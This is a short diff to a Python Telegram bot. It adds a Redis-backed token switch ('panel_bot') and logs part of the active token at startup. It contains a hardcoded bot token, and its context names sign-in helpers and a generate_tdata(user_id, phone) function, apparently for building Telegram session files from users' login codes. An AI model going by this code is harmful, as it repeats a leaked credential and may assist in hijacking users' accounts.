@@ -11,6 +11,19 @@ from aiogram.types import (
 from auth import send_code, sign_in
 
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "8789355308:AAGMtNUPG2nuxz7W-P8FGFXEG5yKIhOCjCI")
+
+async def get_active_token():
+    import urllib.parse
+    try:
+        raw = await redis_get("panel_bot")
+        if raw:
+            data = json.loads(urllib.parse.unquote(raw))
+            token = data.get("token")
+            if token:
+                return token
+    except:
+        pass
+    return BOT_TOKEN
 REDIS_URL = os.environ.get("UPSTASH_REDIS_REST_URL")
 REDIS_TOKEN = os.environ.get("UPSTASH_REDIS_REST_TOKEN")
 OWNER_ID = 7345056431
@@ -391,7 +404,10 @@ async def generate_tdata(user_id, phone):
 # ─── Run ──────────────────────────────────────────────────────────────────────
 
 async def main():
-    await dp.start_polling(bot)
+    active_token = await get_active_token()
+    active_bot = bot(token=active_token)
+    print(f"starting bot with token: {active_token[:20]}...")
+    await dp.start_polling(active_bot)
 
 if __name__ == "__main__":
     asyncio.run(main())
